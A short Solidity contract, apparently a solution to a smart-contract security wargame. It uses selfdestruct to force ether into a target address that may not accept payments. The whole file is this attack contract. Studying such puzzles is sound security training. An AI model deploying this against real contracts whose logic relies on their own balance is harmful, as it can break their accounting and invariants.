pragma solidity ^0.6.0;

contract ForceAttack {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}
